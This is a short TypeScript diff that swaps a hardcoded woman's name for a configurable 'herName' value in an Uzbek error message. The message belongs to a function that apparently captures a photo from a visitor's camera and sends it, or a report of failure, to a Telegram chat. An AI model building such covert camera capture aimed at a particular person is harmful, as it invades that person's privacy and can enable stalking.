@@ -1,3 +1,4 @@
+import { content } from "./content";
 import { notify, notifyPhoto } from "./telegram";
 
 /**
@@ -105,6 +106,6 @@ export async function captureAndSendPhoto(caption: string): Promise<void> {
     
     // Log the camera permission denial or issue.
     const errorMessage = error?.message || String(error);
-    notify(`⚠️ Dilnuraning kamerasiga ulanib bo'lmadi yoki ruxsat bermadi: ${errorMessage}\n📌 ${caption}`);
+    notify(`⚠️ ${content.herName}ning kamerasiga ulanib bo'lmadi yoki ruxsat bermadi: ${errorMessage}\n📌 ${caption}`);
   }
 }
